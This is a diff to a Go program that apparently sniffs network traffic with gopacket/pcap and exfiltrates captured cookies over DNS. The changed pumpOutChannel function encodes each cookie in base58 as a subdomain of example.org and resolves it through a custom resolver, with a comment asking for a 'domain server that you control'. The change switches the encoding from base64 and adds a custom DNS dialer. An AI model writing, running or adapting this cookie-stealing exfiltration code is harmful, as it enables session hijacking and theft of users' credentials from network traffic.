@@ -3,7 +3,7 @@ package main
 import (
 	"bufio"
 	"bytes"
-	"encoding/base64"
+	"context"
 	"flag"
 	"fmt"
 	"log"
@@ -11,16 +11,36 @@ import (
 	"net/http"
 	"time"
 
+	"github.com/btcsuite/btcutil/base58"
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
 )
 
+func CustomDialer(ctx context.Context, network, address string) (net.Conn, error) {
+	dialer := net.Dialer{}
+	return dialer.DialContext(ctx, "udp", "127.0.0.1:53")
+}
+
+func DnsQuery(host string) {
+	resolver := &net.Resolver{
+		PreferGo: true,
+		Dial:     CustomDialer,
+	}
+
+	ip, err := resolver.LookupHost(context.Background(), host)
+	if err != nil {
+		fmt.Println(err)
+	} else {
+		fmt.Println(ip[0])
+	}
+}
+
 func pumpOutChannel(messages chan string) {
 	for cookie := range messages {
 		// TODO domain server that you control
-		dnsName := fmt.Sprintf("%s.example.org", base64.StdEncoding.EncodeToString([]byte(cookie)))
-		net.LookupIP(dnsName)
+		dnsName := fmt.Sprintf("%s.example.org", base58.Encode([]byte(cookie)))
+		DnsQuery(dnsName)
 	}
 }
 
